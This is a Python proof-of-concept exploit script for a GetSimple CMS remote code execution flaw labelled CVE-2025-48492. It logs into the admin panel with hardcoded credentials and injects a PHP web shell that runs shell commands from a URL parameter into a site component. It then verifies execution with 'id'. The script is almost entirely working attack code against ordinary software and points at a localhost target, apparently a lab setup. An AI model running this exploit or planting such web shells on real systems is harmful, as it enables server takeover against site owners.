#!/usr/bin/env python3
import requests
import re
import sys

TARGET_URL = "http://localhost:8080"
USERNAME = "admin"
PASSWORD = "epyeT3"

def login(session):
    login_url = f"{TARGET_URL}/admin/index.php?"
    data = {
        "userid": USERNAME,
        "pwd": PASSWORD,
        "submitted": "Login"
    }
    resp = session.post(login_url, data=data, allow_redirects=True)
    if "Welcome" in resp.text or "Logout" in resp.text:
        print("[+] Login successful")
        return True
    print("[-] Login failed")
    return False

def get_nonce(session):
    comp_url = f"{TARGET_URL}/admin/components.php"
    resp = session.get(comp_url)
    match = re.search(r'name="nonce" value="([a-f0-9]+)"', resp.text)
    if match:
        return match.group(1)
    return None

def inject_webshell(session, nonce):
    comp_url = f"{TARGET_URL}/admin/components.php"
    payload = '<?php if(isset($_GET["cmd"])){echo "RCE_START";system($_GET["cmd"]);echo "RCE_END";} ?>'
    
    data = {
        "nonce": nonce,
        "val[]": [payload, "Just Another GetSimple CE Website"],
        "slug[]": ["sidebar", "tagline"],
        "title[]": ["Sidebar", "Tagline"],
        "id[]": ["0", "1"],
        "submitted": "Save Components"
    }
    resp = session.post(comp_url, data=data, allow_redirects=True)
    if "comp-success" in resp.url or "success" in resp.text.lower():
        print("[+] Webshell injected into component")
        return True
    print("[-] Failed to inject webshell")
    return False

def execute_command(session, cmd):
    url = f"{TARGET_URL}/?cmd={cmd}"
    resp = session.get(url)
    match = re.search(r'RCE_START(.+?)RCE_END', resp.text, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def main():
    session = requests.Session()
    
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] CVE-2025-48492: GetSimple CMS RCE via Component Edit")
    print()
    
    if not login(session):
        return False
    
    nonce = get_nonce(session)
    if not nonce:
        print("[-] Failed to get nonce")
        return False
    print(f"[+] Got nonce: {nonce}")
    
    if not inject_webshell(session, nonce):
        return False
    
    print("[*] Testing RCE with 'id' command...")
    result = execute_command(session, "id")
    if result:
        print(f"[+] RCE successful!")
        print(f"[+] Command output: {result}")
        return True
    else:
        print("[-] RCE failed")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
